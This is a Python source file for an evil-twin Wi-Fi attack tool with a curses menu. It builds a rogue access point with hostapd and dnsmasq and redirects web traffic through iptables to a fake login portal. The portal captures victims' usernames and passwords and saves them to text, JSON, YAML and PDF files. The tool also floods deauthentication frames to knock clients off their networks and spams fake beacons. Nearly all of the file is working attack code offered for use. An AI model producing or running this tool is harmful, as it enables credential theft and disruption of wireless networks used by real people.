import curses
import os
import time
import subprocess
import json
import yaml
import logging
import threading
import random
from tqdm import tqdm
from fpdf import FPDF
from scapy.all import *
from flask import Flask, request, render_template_string
from termcolor import colored  # pip install termcolor

# Setup logging
logging.basicConfig(filename='evil_twin.log', level=logging.INFO, format='%(asctime)s - %(message)s')

# Global variables
captured_creds = []
is_running = False
app = Flask(__name__)
iface = 'wlan0'  # Default interface, configurable
monitor_iface = 'wlan0mon'  # Assume monitor mode enabled

# ASCII Banner
BANNER = colored("""
   _____     _     _   _____     _     _
  |   __|___|_|___| |_|_   _|___|_|___| |_
  |   __| .'| |  _|  _| | | | .'| | . |  _|
  |_____|__,|_|___|_|   |_| |__,|_|  _|_|
                                  |_|    
v1.0 Developed by the Background Gremlin Group
""", 'green')

# Check if root
def is_root():
    return os.getuid() == 0

# Function to enable monitor mode (requires root)
def enable_monitor_mode():
    if not is_root():
        logging.warning("Cannot enable monitor mode without root.")
        return False
    try:
        subprocess.call(['iwconfig', iface, 'mode', 'monitor'])
        subprocess.call(['ifconfig', iface, 'up'])
        global monitor_iface
        monitor_iface = iface
        logging.info("Monitor mode enabled.")
        return True
    except Exception as e:
        logging.error(f"Error enabling monitor mode: {e}")
        return False

# Function to disable monitor mode
def disable_monitor_mode():
    if is_root():
        try:
            subprocess.call(['ifconfig', monitor_iface, 'down'])
            subprocess.call(['iwconfig', monitor_iface, 'mode', 'managed'])
            subprocess.call(['ifconfig', monitor_iface, 'up'])
            logging.info("Monitor mode disabled.")
        except Exception as e:
            logging.error(f"Error disabling monitor mode: {e}")

# Scan for APs using airodump-ng
def scan_aps():
    if not is_root():
        print(colored("Scanning requires root. Limited scan.", 'yellow'))
        return []
    try:
        print(colored("Starting scan... Press Ctrl+C after 10 seconds to stop.", 'cyan'))
        with tqdm(total=10, desc="Scanning APs", bar_format='{l_bar}{bar} | {n_fmt}/{total_fmt}') as pbar:
            proc = subprocess.Popen(['airodump-ng', monitor_iface])
            for _ in range(10):
                time.sleep(1)
                pbar.update(1)
        proc.terminate()
        print(colored("Scan complete. Manually enter target SSID and channel.", 'green'))
        return []  # For TUI, user inputs manually
    except Exception as e:
        logging.error(f"Scan error: {e}")
        print(colored("Error during scan.", 'red'))
        return []

# Start Evil Twin AP
def start_evil_twin(ssid, channel):
    global is_running
    if not is_root():
        print(colored("Cannot start AP without root.", 'red'))
        return
    try:
        print(colored("Configuring hostapd and dnsmasq...", 'cyan'))
        # Write hostapd.conf
        with open('hostapd.conf', 'w') as f:
            f.write(f"interface={iface}\n")
            f.write("driver=nl80211\n")
            f.write(f"ssid={ssid}\n")
            f.write(f"channel={channel}\n")
            f.write("hw_mode=g\n")
        # Write dnsmasq.conf
        with open('dnsmasq.conf', 'w') as f:
            f.write(f"interface={iface}\n")
            f.write("dhcp-range=10.0.0.10,10.0.0.250,12h\n")
            f.write("dhcp-option=3,10.0.0.1\n")
            f.write("dhcp-option=6,10.0.0.1\n")
        # Set IP
        subprocess.call(['ifconfig', iface, '10.0.0.1/24', 'up'])
        # Start dnsmasq
        dns_proc = subprocess.Popen(['dnsmasq', '-C', 'dnsmasq.conf'])
        # Start hostapd
        host_proc = subprocess.Popen(['hostapd', 'hostapd.conf'])
        # Enable forwarding
        with open('/proc/sys/net/ipv4/ip_forward', 'w') as fd:
            fd.write('1')
        # IPTables for redirect
        subprocess.call(['iptables', '-t', 'nat', '-A', 'PREROUTING', '-p', 'tcp', '--dport', '80', '-j', 'REDIRECT', '--to-port', '5000'])
        print(colored("Evil Twin AP started.", 'green'))
        logging.info("Evil Twin AP started.")
        is_running = True
        # Start captive portal in thread
        threading.Thread(target=run_portal).start()
    except Exception as e:
        logging.error(f"Error starting Evil Twin: {e}")
        print(colored("Error starting AP.", 'red'))

# Stop Evil Twin
def stop_evil_twin():
    global is_running
    try:
        subprocess.call(['killall', 'dnsmasq', 'hostapd'])
        with open('/proc/sys/net/ipv4/ip_forward', 'w') as fd:
            fd.write('0')
        subprocess.call(['iptables', '--flush'])
        subprocess.call(['iptables', '--flush', '-t', 'nat'])
        print(colored("Evil Twin stopped.", 'green'))
        logging.info("Evil Twin stopped.")
        is_running = False
    except Exception as e:
        logging.error(f"Error stopping Evil Twin: {e}")
        print(colored("Error stopping AP.", 'red'))

# Deauth attack using scapy
def deauth_attack(bssid, client='ff:ff:ff:ff:ff:ff', count=10):
    if not is_root():
        print(colored("Deauth requires root.", 'red'))
        return
    try:
        pkt = RadioTap() / Dot11(addr1=client, addr2=bssid, addr3=bssid) / Dot11Deauth(reason=7)
        with tqdm(total=count, desc="Sending Deauth Packets") as pbar:
            for _ in range(count):
                sendp(pkt, iface=monitor_iface, verbose=0)
                pbar.update(1)
                time.sleep(0.1)
        print(colored(f"Deauth sent to {client} from {bssid}.", 'green'))
        logging.info(f"Deauth successful: {bssid} -> {client}")
    except Exception as e:
        logging.error(f"Deauth error: {e}")
        print(colored("Error in deauth.", 'red'))

# Beacon spam
def beacon_spam(ssid_list, duration=10):
    if not is_root():
        print(colored("Beacon spam requires root.", 'red'))
        return
    try:
        def send_beacons():
            for _ in range(duration * 10):
                ssid = random.choice(ssid_list)
                dot11 = Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff',
                              addr2=randmac(), addr3=randmac())
                beacon = Dot11Beacon(cap='ESS+privacy')
                essid = Dot11Elt(ID='SSID', info=ssid, len=len(ssid))
                pkt = RadioTap() / dot11 / beacon / essid
                sendp(pkt, iface=monitor_iface, verbose=0)
                time.sleep(0.1)
        threading.Thread(target=send_beacons).start()
        with tqdm(total=duration, desc="Beacon Spamming") as pbar:
            for _ in range(duration):
                time.sleep(1)
                pbar.update(1)
        print(colored("Beacon spam complete.", 'green'))
        logging.info("Beacon spam successful.")
    except Exception as e:
        logging.error(f"Beacon spam error: {e}")
        print(colored("Error in beacon spam.", 'red'))

# Captive portal
def run_portal():
    @app.route('/', methods=['GET', 'POST'])
    def index():
        if request.method == 'POST':
            user = request.form.get('user', '')
            pwd = request.form.get('pass', '')
            captured_creds.append({'user': user, 'pass': pwd})
            logging.info(f"Captured: {user}:{pwd}")
            print(colored(f"Captured credentials: {user}:{pwd}", 'green'))
            return "Connected successfully!"
        return render_template_string("""
        <h1>WiFi Login</h1>
        <form method="post">
            Username: <input name="user"><br>
            Password: <input name="pass" type="password"><br>
            <input type="submit">
        </form>
        """)

    app.run(host='0.0.0.0', port=5000, debug=False, use_reloader=False)

# Save data
def save_data():
    try:
        # TXT
        with open('creds.txt', 'w') as f:
            for cred in captured_creds:
                f.write(f"{cred['user']}:{cred['pass']}\n")
        # JSON
        with open('creds.json', 'w') as f:
            json.dump(captured_creds, f)
        # YAML
        with open('creds.yaml', 'w') as f:
            yaml.dump(captured_creds, f)
        # PDF
        pdf = FPDF()
        pdf.add_page()
        pdf.set_font("Arial", size=12)
        pdf.cell(200, 10, txt="Captured Credentials Report", ln=1, align='C')
        for cred in captured_creds:
            pdf.cell(200, 10, txt=f"User: {cred['user']}, Pass: {cred['pass']}", ln=1)
        pdf.output("report.pdf")
        print(colored("Data saved to txt, json, yaml, pdf.", 'green'))
        logging.info("Data saved.")
    except Exception as e:
        logging.error(f"Save error: {e}")
        print(colored("Error saving data.", 'red'))

# TUI Main
def tui_main(stdscr):
    curses.curs_set(0)
    stdscr.clear()
    stdscr.addstr(0, 0, BANNER)
    stdscr.refresh()

    root_status = "Root" if is_root() else "Non-Root (Limited)"
    stdscr.addstr(10, 0, colored(f"Status: {root_status}", 'yellow' if not is_root() else 'green'))

    menu = [
        "1. Enable Monitor Mode",
        "2. Scan APs",
        "3. Start Evil Twin",
        "4. Stop Evil Twin",
        "5. Deauth Attack",
        "6. Beacon Spam",
        "7. Save Data",
        "8. View Logs",
        "9. Exit"
    ]

    current_row = 0
    while True:
        for idx, item in enumerate(menu):
            if idx == current_row:
                stdscr.addstr(12 + idx, 0, item, curses.A_REVERSE)
            else:
                stdscr.addstr(12 + idx, 0, item)
        stdscr.refresh()

        key = stdscr.getch()
        if key == curses.KEY_UP and current_row > 0:
            current_row -= 1
        elif key == curses.KEY_DOWN and current_row < len(menu) - 1:
            current_row += 1
        elif key == 10:  # Enter
            stdscr.clear()
            if current_row == 0:
                enable_monitor_mode()
            elif current_row == 1:
                scan_aps()
            elif current_row == 2:
                ssid = input("Enter SSID: ")
                channel = input("Enter Channel: ")
                start_evil_twin(ssid, int(channel))
            elif current_row == 3:
                stop_evil_twin()
            elif current_row == 4:
                bssid = input("Enter BSSID: ")
                client = input("Enter Client MAC (ff:ff:ff:ff:ff:ff for all): ")
                deauth_attack(bssid, client)
            elif current_row == 5:
                ssids = input("Enter AP names (comma separated): ").split(',')
                beacon_spam(ssids)
            elif current_row == 6:
                save_data()
            elif current_row == 7:
                with open('evil_twin.log', 'r') as f:
                    logs = f.read()
                print(logs)
            elif current_row == 8:
                disable_monitor_mode()
                break
            stdscr.clear()
            stdscr.addstr(0, 0, BANNER)
            stdscr.refresh()

if __name__ == '__main__':
    if not is_root():
        print(colored("Running without root: Limited features (no AP, deauth, etc.).", 'yellow'))
    curses.wrapper(tui_main)
